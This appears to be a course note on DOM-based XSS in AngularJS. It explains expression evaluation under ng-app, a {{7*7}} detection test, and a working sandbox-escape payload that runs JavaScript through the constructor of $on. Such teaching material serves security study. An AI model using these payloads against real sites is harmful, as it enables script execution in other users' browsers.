# DOM XSS in AngularJS

## Overview

AngularJS is a JavaScript framework that can execute expressions directly inside HTML.

Unlike traditional XSS, AngularJS can sometimes execute JavaScript even when:

```text
Angle Brackets Are Encoded
```

---

# AngularJS Expressions

AngularJS evaluates:

```html
{{ expression }}
```

inside pages containing:

```html
ng-app
```

directive.

---

# Example

```html
<div ng-app>

{{7*7}}

</div>
```

Result:

```text
49
```

---

# Why This Matters

Applications may encode:

```html
<script>
```

but fail to sanitize:

```html
{{ }}
```

expressions.

---

# Detection

## Step 1

Inspect page.

Look for:

```html
ng-app
```

---

## Step 2

Test:

```html
{{7*7}}
```

---

## Step 3

If output becomes:

```text
49
```

AngularJS execution confirmed.

---

# Exploitation Example

Payload:

```html
{{$on.constructor('alert(1)')()}}
```

---

Flow:

```text
User Input
        ↓
Angular Expression
        ↓
Angular Evaluation
        ↓
alert(1)
```

---

# Why It Works

AngularJS internally uses:

```javascript
Function()
```

constructors.

Attackers can abuse these constructors to execute arbitrary JavaScript.

---

# Common Scenario

```text
Input Reflected
        ↓
HTML Encoded
        ↓
Normal XSS Fails
        ↓
Angular Expression Executes
```

---

# Related Lab

- lab08-dom-xss-angularjs-expression.md

---

# Key Takeaways

- AngularJS introduces framework-specific XSS.
- {{ }} expressions may execute code.
- HTML encoding does not always stop AngularJS XSS.
- Always test for ng-app directives.